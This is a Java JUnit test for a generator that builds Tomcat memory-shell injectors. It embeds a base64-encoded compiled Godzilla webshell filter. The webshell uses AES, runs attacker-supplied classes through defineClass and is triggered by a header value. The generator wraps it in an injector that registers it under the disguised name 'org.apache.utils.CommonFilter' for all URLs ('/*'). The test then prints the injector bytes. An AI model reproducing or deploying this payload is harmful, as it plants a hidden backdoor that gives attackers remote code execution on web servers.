package com.reajason.javaweb.memsell;

import com.reajason.javaweb.memsell.tomcat.injector.TomcatFilterInjector;
import com.reajason.javaweb.util.ClassUtils;
import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class InjectorGeneratorTest {

    InjectorGenerator injectorGenerator = new InjectorGenerator();

    @Test
    @SneakyThrows
    void generateGodzilla() {
        byte[] shellBytes = Base64.decodeBase64("yv66vgAAADQBNgoARQCgCgBFAKEKAEUAoggAowoApAClBwCmCQAaAKcKAD4AqAoABgCpCgCkAKoKAKQAqwcArAcArQcArgkAGgCvCwANALAJABoAsQoAPgCyCwANALMJABoAtAsADQC1CgAaALYKABoAtwgAuAsAuQC6BwC7CgA9ALwKACQAvQoAGgChCgAaAL4LALkAvwgAwAsADQC/BwDBCgAiAKAHAMIKACQAwwcAxAcAxQcAxgoAKADHCgA9AMgLAA4AyQkAGgDKCgA+AMsKAMwAzQoAPQDOCgAiAM8KABoA0AoAPgDRCwDSANMIANQKACQA1QgA1gcA1woAJADYBwDZCgDaANsIANwHAFoHAN0HAN4IAN8IAOAIAOEIAOIIAOMIAOQHAOUHAOYBAANrZXkBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXNzAQADbWQ1AQAKaGVhZGVyTmFtZQEAC2hlYWRlclZhbHVlAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAD1MY29tL3JlYWphc29uL2phdmF3ZWIvbWVtc2VsbC90b21jYXQvZ29kemlsbGEvR29kemlsbGFGaWx0ZXI7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEACVNpZ25hdHVyZQEAGChbQilMamF2YS9sYW5nL0NsYXNzPCo+OwEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwC7BwDnBwCsAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABZgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWUBAChMamF2YS9sYW5nL1JlZmxlY3RpdmVPcGVyYXRpb25FeGNlcHRpb247AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsHAOgHAOkHAOoHAK0HAK4HAOsHAMEHAOwHAN0BAApFeGNlcHRpb25zBwDtBwDuAQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAHZGVzdHJveQEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdlbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwcA3gEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAKU291cmNlRmlsZQEAE0dvZHppbGxhRmlsdGVyLmphdmEMAE0ATgwATQBUDADvAPABAANBRVMHAOcMAPEA8gEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAEcASAwA8wD0DABNAPUMAIsA9gwA9wD4AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQwASwBIDAD5APoMAEwASAwA+wD8DAD9AP4MAEkASAwA/wD6DACbAJwMAF0AXgEAB3BheWxvYWQHAOsMAQABAQEAO2NvbS9yZWFqYXNvbi9qYXZhd2ViL21lbXNlbGwvdG9tY2F0L2dvZHppbGxhL0dvZHppbGxhRmlsdGVyDAECAQMMAQQBBQwAVwBYDAEGAQcBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BAA9qYXZhL2xhbmcvQ2xhc3MMAQgBCQEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwATQEKDAELAQwMAQ0BDgwASgBIDAEPARAHAREMARIBEwwBFAEVDAEWAPQMAJAAkQwBDwEXBwDqDABqARgBABBqYXZhLnV0aWwuQmFzZTY0DAEZARoBAApnZXRFbmNvZGVyAQASW0xqYXZhL2xhbmcvQ2xhc3M7DAEbARwBABNbTGphdmEvbGFuZy9PYmplY3Q7BwEdDAEeAR8BAA5lbmNvZGVUb1N0cmluZwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAJmphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9CeXRlQXJyYXkBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAEAoTGphdmF4L3NlcnZsZXQvU2Vydmxl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");
        String shellClassName = "org.apache.utils.CommonFilter";
        String injectClassName = "org.junit.jupiter.InjectUtil";
        byte[] bytes = injectorGenerator.generate(TomcatFilterInjector.class, injectClassName, shellClassName, shellBytes, "/*");
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(injectClassName, obj.getClass().getName());
        assertEquals(shellClassName, ClassUtils.invokeMethod(obj, "getClassName", null, null).toString());
        assertEquals("/*", ClassUtils.invokeMethod(obj, "getUrlPattern", null, null).toString());
        assertEquals(Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), ""),
                ClassUtils.invokeMethod(obj, "getBase64String", null, null).toString());

//        Object filter = ClassUtils.invokeMethod(obj, "getFilter", new Class[]{Object.class}, new Object[]{null});
//        assertEquals(shellClassName, filter.getClass().getName());
//
//        FileUtil.writeFile("InjectUtil.class", bytes);
        System.out.println(Base64.encodeBase64String(bytes));
    }
}